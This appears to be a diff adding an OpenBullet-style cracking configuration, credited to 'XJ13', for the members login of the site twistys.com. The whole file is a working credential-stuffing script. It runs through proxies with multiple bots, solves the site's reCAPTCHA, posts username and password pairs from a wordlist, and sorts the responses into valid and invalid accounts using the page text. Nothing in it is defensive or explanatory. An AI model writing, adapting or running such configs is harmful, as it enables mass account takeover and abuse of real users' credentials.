@@ -1,0 +1,48 @@
+[SETTINGS]
+{
+  "Name": "Twistys",
+  "SuggestedBots": 10,
+  "LastModified": "2018-05-20T08:36:00.9122569+00:00",
+  "AdditionalInfo": "",
+  "Author": "XJ13",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "None",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#MAIN_PAGE_(GET) REQUEST GET "https://members.twistys.com/access/login/" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+RECAPTCHA "https://members.twistys.com/access/login/" "6LdDbhsTAAAAAIMTjhWTi-HOpzkIni1whwgydI_k" -> VAR "RECAPTCHA" 
+#LOGIN_(POST) REQUEST POST "https://members.twistys.com/access/submit/" AutoRedirect=TRUE 
+  CONTENT "username=<USER>&password=<PASS>&g-recaptcha-response=<RECAPTCHA>&rememberme=on" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Referer: https://members.twistys.com/access/login/" 
+  HEADER "Origin: https://members.twistys.com" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "Unauthorized Attempt" 
+    KEY "Membership has Expired" 
+  KEYCHAIN Success OR 
+    KEY "access/success" 
+    KEY "Please wait while we log you in..." 
+PARSE "<SOURCE>" LR "/success/?" "\"" Recursive=FALSE -> CAP "success" "" "" 
